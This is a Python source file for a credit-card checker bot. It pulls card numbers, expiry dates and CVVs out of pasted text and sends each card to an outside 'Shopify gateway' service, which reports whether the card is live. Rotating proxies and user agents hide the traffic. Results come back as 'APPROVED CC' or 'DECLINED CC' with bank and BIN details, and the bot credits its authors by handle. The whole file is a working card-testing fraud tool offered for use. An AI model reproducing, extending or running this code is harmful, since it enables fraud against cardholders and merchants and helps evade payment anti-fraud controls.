import requests
import os
import re
import random
import string
import time
import json
from user_agent import generate_user_agent
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
GATEWAY_URL = "https://chk-for-shopify.onrender.com"
MAX_CARDS_PER_MCHK = 100

def get_rotating_user_agent():
    """Generate different types of user agents"""
    agents = [
        generate_user_agent(device_type='desktop'),
        generate_user_agent(device_type='desktop', os=('mac', 'linux')),
        generate_user_agent(device_type='desktop', os=('win',)),
        generate_user_agent(navigator='chrome'),
        generate_user_agent(navigator='firefox'),
    ]
    return random.choice(agents)

def get_random_proxy():
    """Get a random proxy from proxy.txt file"""
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            proxy = random.choice(proxies).strip()

            # Parse proxy string (format: host:port:username:password)
            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'http://{username}:{password}@{host}:{port}'
                }
                return proxy_dict
            return None
    except Exception as e:
        print(f"Error reading proxy file: {str(e)}")
        return None

def parse_proxy(proxy_str):
    """Parse proxy string into components"""
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, username, password = parts
        return {
            'http': f'http://{username}:{password}@{ip}:{port}',
            'https': f'http://{username}:{password}@{ip}:{port}'
        }
    else:
        # If no auth, use without credentials
        ip, port = parts[0], parts[1]
        return {
            'http': f'http://{ip}:{port}',
            'https': f'http://{ip}:{port}'
        }

def load_proxies():
    """Load proxies from proxy.txt file"""
    if os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    return []

def normalize_card(text):
    """
    Improved card extraction that properly handles MM/YY format
    """
    if not text:
        return None
        
    # Standardize separators
    text = re.sub(r'[^\d|/\s]', ' ', text)
    
    # Match CC number (13-19 digits)
    cc_match = re.search(r'(?:\D|^)(\d{13,19})(?:\D|$)', text)
    if not cc_match:
        return None
        
    cc = cc_match.group(1).replace(' ', '')
    
    # Match expiration (mm/yy or mm/yyyy)
    exp_match = re.search(r'(\d{1,2})[ /](\d{2,4})', text)
    if not exp_match:
        return None
        
    mm = exp_match.group(1).zfill(2)
    yy = exp_match.group(2)
    
    # Handle 2-digit year (properly)
    if len(yy) == 2:
        current_year_short = time.strftime('%y')
        current_century = time.strftime('%Y')[:2]
        if int(yy) >= int(current_year_short):
            yy = current_century + yy
        else:
            yy = str(int(current_century)+1) + yy
    
    # Match CVV (3-4 digits)
    cvv_match = re.search(r'(?:\D|^)(\d{3,4})(?:\D|$)', text[exp_match.end():])
    if not cvv_match:
        cvv_match = re.search(r'(?:cvv|security.?code)\D*(\d{3,4})', text, re.I)
        if not cvv_match:
            return None
            
    cvv = cvv_match.group(1)
    
    return f"{cc}|{mm}|{yy}|{cvv}"

def extract_cards_from_text(text):
    """Extract all valid cards from text with improved patterns"""
    cards = []
    lines = text.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
            
        # Try to normalize the whole line first
        norm_card = normalize_card(line)
        if norm_card:
            cards.append(norm_card)
            if len(cards) >= MAX_CARDS_PER_MCHK:
                break
            continue
            
        # If normalization fails, try more aggressive pattern matching
        patterns = [
            # Standard format: 4111111111111111|12|2025|123
            r'(?:\b|^)(\d{13,19})\b[\s|/]*(\d{1,2})\b[\s|/]*(\d{2,4})\b[\s|/]*(\d{3,4})\b',
            # Format with separators: 4111 1111 1111 1111 12/25 123
            r'(?:\b|^)(\d{4}\s?\d{4}\s?\d{4}\s?\d{4})\b[\s|/]*(\d{1,2})\b[\s|/]*(\d{2,4})\b[\s|/]*(\d{3,4})\b',
            # Format with labels: CCNUM: 4034465129749674 CVV: 029 EXP: 09/2033
            r'(?:cc|card|number)\D*(\d{13,19})\D*(?:exp|date)\D*(\d{1,2})\D*(\d{2,4})\D*(?:cvv|security)\D*(\d{3,4})',
            # Format with MM/YY: 5597670076299187 04/27 747
            r'(?:\b|^)(\d{13,19})\b.*?(\d{1,2})[/ ](\d{2})(?:\D|$).*?(\d{3,4})\b'
        ]
        
        for pattern in patterns:
            matches = re.finditer(pattern, line, re.IGNORECASE)
            for match in matches:
                cc = match.group(1).replace(' ', '')
                mm = match.group(2).zfill(2)
                yy = match.group(3)
                cvv = match.group(4)
                
                # Special handling for MM/YY format (2-digit year)
                if len(yy) == 2 and pattern == patterns[-1]:
                    current_year_short = time.strftime('%y')
                    current_century = time.strftime('%Y')[:2]
                    if int(yy) >= int(current_year_short):
                        yy = current_century + yy
                    else:
                        yy = str(int(current_century)+1) + yy
                
                card = f"{cc}|{mm}|{yy}|{cvv}"
                if card not in cards:
                    cards.append(card)
                    if len(cards) >= MAX_CARDS_PER_MCHK:
                        break
            
            if len(cards) >= MAX_CARDS_PER_MCHK:
                break
                
    return cards[:MAX_CARDS_PER_MCHK]

def extract_api_response(raw_text):
    """Extract the response message from API raw response"""
    try:
        # Look for the response line pattern: "📩 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ↯ CARD_DECLINED"
        response_match = re.search(r'📩\s*𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄\s*↯\s*(.+)', raw_text)
        if response_match:
            return response_match.group(1).strip()
        
        # Alternative pattern if the first one doesn't match
        response_match2 = re.search(r'RESPONSE[:\s↯-]+\s*(.+)', raw_text, re.IGNORECASE)
        if response_match2:
            return response_match2.group(1).strip()
            
        # If no specific response found, return the first meaningful line
        lines = raw_text.split('\n')
        for line in lines:
            line = line.strip()
            if line and not line.startswith('┏') and not line.startswith('┗') and '━━' not in line:
                return line
                
        return raw_text[:100] + "..." if len(raw_text) > 100 else raw_text
        
    except Exception as e:
        return f"Error parsing response: {str(e)}"

def clean_raw_response(text):
    """Clean the raw response by removing unwanted characters"""
    try:
        # Remove <pre> tags if present
        text = text.replace('<pre>', '').replace('</pre>', '')
        # Remove backslashes that escape special characters
        text = text.replace('\\', '')
        return text.strip()
    except:
        return text

def get_bin_info(bin_number):
    """Get BIN information from handyapi.com"""
    if not bin_number or len(bin_number) < 6:
        return {
            'brand': 'UNKNOWN',
            'type': 'UNKNOWN',
            'level': 'UNKNOWN',
            'bank': 'UNKNOWN',
            'country': 'UNKNOWN',
            'emoji': '🏳️'
        }
    
    try:
        response = requests.get(
            f'https://data.handyapi.com/bin/{bin_number[:6]}', 
            timeout=5,
            headers={"User-Agent": get_rotating_user_agent()}
        )
        
        if response.status_code == 200:
            data = response.json()
            
            # Check if the API returned success
            if data.get('Status') == 'SUCCESS':
                return format_handyapi_data(data)
            else:
                return get_fallback_bin_info(bin_number)
        else:
            return get_fallback_bin_info(bin_number)
            
    except Exception as e:
        print(f"BIN API error: {str(e)}")
        return get_fallback_bin_info(bin_number)

def format_handyapi_data(data):
    """Format data from handyapi.com"""
    try:
        # Extract brand/scheme
        brand = data.get('Scheme', 'UNKNOWN')
        if not brand or brand == 'UNKNOWN':
            brand = data.get('Brand', 'UNKNOWN')
        
        # Extract card type
        card_type = data.get('Type', 'CREDIT')
        if not card_type:
            card_type = 'CREDIT'
        
        # Extract bank/issuer
        bank = data.get('Issuer', 'UNKNOWN')
        if not bank or bank == 'UNKNOWN':
            bank = data.get('Bank', 'UNKNOWN')
        
        # Extract country information
        country_data = data.get('Country', {})
        country_name = 'UNKNOWN'
        country_code = ''
        
        if isinstance(country_data, dict):
            country_name = country_data.get('Name', 'UNKNOWN')
            country_code = country_data.get('A2', '')
        
        # Extract card level/tier
        card_level = data.get('CardTier', 'STANDARD')
        if not card_level or card_level == 'STANDARD':
            card_level = data.get('Level', 'STANDARD')
        
        # Get country emoji
        emoji = get_country_emoji(country_code)
        
        # Clean up the data
        if bank == 'UNKNOWN' and brand != 'UNKNOWN':
            bank = f'{brand} BANK'
        
        return {
            'brand': brand.upper() if brand != 'UNKNOWN' else 'UNKNOWN',
            'type': card_type.upper() if card_type != 'UNKNOWN' else 'CREDIT',
            'level': card_level.upper() if card_level != 'UNKNOWN' else 'STANDARD',
            'bank': bank.upper() if bank != 'UNKNOWN' else 'UNKNOWN',
            'country': country_name.upper() if country_name != 'UNKNOWN' else 'UNKNOWN',
            'emoji': emoji
        }
    except Exception as e:
        print(f"Error formatting BIN data: {str(e)}")
        return get_fallback_bin_info(None)

def get_country_emoji(country_code):
    """Convert country code to emoji"""
    if not country_code or len(country_code) != 2:
        return '🏳️'
    
    try:
        # Convert to uppercase and get emoji
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return '🏳️'

def get_fallback_bin_info(bin_number):
    """Fallback BIN info if API fails"""
    if not bin_number or len(bin_number) < 6:
        return {
            'brand': 'UNKNOWN',
            'type': 'CREDIT',
            'level': 'STANDARD',
            'bank': 'UNKNOWN',
            'country': 'UNKNOWN',
            'emoji': '🏳️'
        }
    
    # Basic brand detection as fallback
    brand = get_bin_brand_from_pattern(bin_number)
    
    return {
        'brand': brand,
        'type': 'CREDIT',
        'level': 'STANDARD',
        'bank': f'{brand} BANK' if brand != 'UNKNOWN' else 'UNKNOWN',
        'country': 'UNITED STATES',
        'emoji': '🇺🇸'
    }

def get_bin_brand_from_pattern(bin_number):
    """Basic brand detection"""
    if bin_number.startswith('4'):
        return 'VISA'
    elif bin_number.startswith('5'):
        return 'MASTERCARD'
    elif bin_number.startswith('34') or bin_number.startswith('37'):
        return 'AMEX'
    elif bin_number.startswith('6'):
        return 'DISCOVER'
    elif bin_number.startswith('35'):
        return 'JCB'
    elif bin_number.startswith('30') or bin_number.startswith('36') or bin_number.startswith('38'):
        return 'DINERS CLUB'
    else:
        return 'UNKNOWN'

def check_card_shopify(cc_line, proxy_str=None):
    """Main function to check card via Shopify gateway"""
    start_time = time.time()
    
    try:
        # Parse CC
        n, mm, yy, cvc = cc_line.strip().split('|')
        
        # Use proxy if provided
        proxies = None
        if proxy_str:
            proxies = parse_proxy(proxy_str)
        
        max_retries = 3
        timeout_duration = 45
        raw_result = ""
        
        for attempt in range(max_retries):
            try:
                url = f"{GATEWAY_URL}?lista={cc_line}"
                headers = {"User-Agent": get_rotating_user_agent()}
                
                # Add timeout for both connection and read
                response = requests.get(url, headers=headers, timeout=(10, timeout_duration), proxies=proxies)
                
                if response.status_code == 200:
                    raw_text = clean_raw_response(response.text)
                    # Extract the specific response message
                    raw_result = extract_api_response(raw_text)
                    break
                else:
                    if attempt < max_retries - 1:
                        time.sleep(2)
                        continue
                    else:
                        raw_result = "Gateway Error: Service unavailable"
                    
            except requests.exceptions.Timeout:
                if attempt < max_retries - 1:
                    time.sleep(2)
                    continue
                else:
                    raw_result = "Gateway Timeout"
                    
            except requests.exceptions.ConnectionError:
                if attempt < max_retries - 1:
                    time.sleep(3)
                    continue
                else:
                    raw_result = "Connection Error"
                    
            except Exception as e:
                if attempt < max_retries - 1:
                    time.sleep(2)
                    continue
                else:
                    raw_result = f"Gateway Error: {str(e)}"
        
        elapsed_time = time.time() - start_time
        bin_info = get_bin_info(n[:6])
        
        # Check if approved - look for approved indicators in the extracted response
        is_approved = any(x in raw_result.lower() for x in ["charged", "cvv match", "approved", "success", "live"])
        
        if is_approved:
            return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {raw_result}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Gateway

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        else:
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {raw_result}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Gateway

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

    except Exception as e:
        elapsed_time = time.time() - start_time
        return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request failed: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Gateway

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 🏳️
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

def check_cards_shopify(cc_lines, proxy_str=None):
    """Mass check function for multiple cards via Shopify"""
    results = []
    for cc_line in cc_lines:
        result = check_card_shopify(cc_line, proxy_str)
        results.append(result)
        time.sleep(1.2)  # Delay between checks
    return results

# For standalone testing
if __name__ == "__main__":
    # Test with a single card
    test_cc = "4111111111111111|12|2025|123"
    print("Testing Shopify checker...")
    result = check_card_shopify(test_cc)
    print(result)
